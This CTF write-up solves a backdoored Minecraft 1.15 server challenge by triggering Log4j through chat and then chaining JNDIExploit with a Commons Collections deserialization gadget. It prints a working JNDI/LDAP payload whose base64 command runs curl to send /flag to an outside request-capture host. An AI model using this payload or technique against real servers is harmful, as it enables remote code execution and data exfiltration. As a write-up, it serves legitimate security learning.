## Mineme

[+] Download [SOURCE_CODE](https://drive.google.com/uc?id=1PFppvmsCi3VC3p4_a-ZXdl9J8lB1xck4&export=download)

[+] Description of challenge

![img](https://i.imgur.com/Qezua1Q.png)

- The frist download MineCraft [tlauncher](https://tlauncher.org/)
- Server game `149.28.135.96:13337`

### Setup

- After downloading `Tlaucher` to run the game, you need to choose the correct `version 1.15` as below, because the server is provided as `server_1.15`

- Continue to the `mutiplayer` section to add your server or the author.

- To run the server in localhost, you can use the dockerfile that the author provides or runs files `server_1.15.jar`

- After running the file server_1.15.jar, the results will be. Server will be localhost: 25565

## Analysis

- After I opened the file `server_1.15.jar` with `JD-GUI`, it was quite shocked because too much `class`, because I never tried to see the server of Minecarft Code. Now that I go to read each class, it's a bit tired, so I decided to go to Google to read some articles about Minecarft's server.

- Because the description mentioned backdoor, I download another server on the internet, namely `version 1.15.2` to `DIFF`.

- Command used `diff` by `IntelliJ`

- After surfing, there is no difference that is related to this challenge exploitation, only one thing is worth noting in the author's file provided, with adding `collection` => may be related to `Deserialize`

- One more thing is that the `Log4j` vulnerability when public is available, the articles also mention Minecarft influenced by this vulnerability. So here I tried `Trigger Log4J` to see if it was successful.

- Try chat with payload `Log4j `then realize that there is a DNS return => The program has a `log4j vulnerability`

### Exploitation

- If trigger was `Log4j`, I continued to need RCE to get the flag. I use `JNDIExploit` tool with `Basic Queries`, I can't `RCE`.

- Above when I `diff`, there is `collection` => may be related to `Deserialize`. So in this tool has some part to create Payload with the Gadget.

- First, I tried with `Payload URLDNS` and `CommonsCollectionsK1 /DNSLOG`, I saw `DNS` to the domain, but when running with `CommonsCollectionsK2` to RCE, it was not working again.
- I decided to fix the payload of `CommonsCollectionsK1` from`ldap://[IP_VPS]:1389/Deserialization/CommonsCollectionsK1/Dnslog/` to `ldap://[IP_VPS]:1389/Deserialization/CommonsCollectionsK1/Command/Base64/Y3VybCAtZCBAL2ZsYWcgaHR0cDovL3N1cWw0bWF0LnJlcXVlc3RyZXBvLmNvbQ==`

[+] Run tool command
![](https://i.imgur.com/XXrWUVy.png)

- Change your IP vps into red point

- Send payload to get flag

```
${jndi:ldap://165.22.109.11:1389/Deserialization/CommonsCollectionsK1/Command/Base64/Y3VybCAtZCBAL2ZsYWcgaHR0cDovL3N1cWw0bWF0LnJlcXVlc3RyZXBvLmNvbQ==}
```

- In `3VybCAtZCBAL2ZsYWcgaHR0cDovL3N1cWw0bWF0LnJlcXVlc3RyZXBvLmNvbQ==`  is `curl -d @/flag http://suql4mat.requestrepo.com`
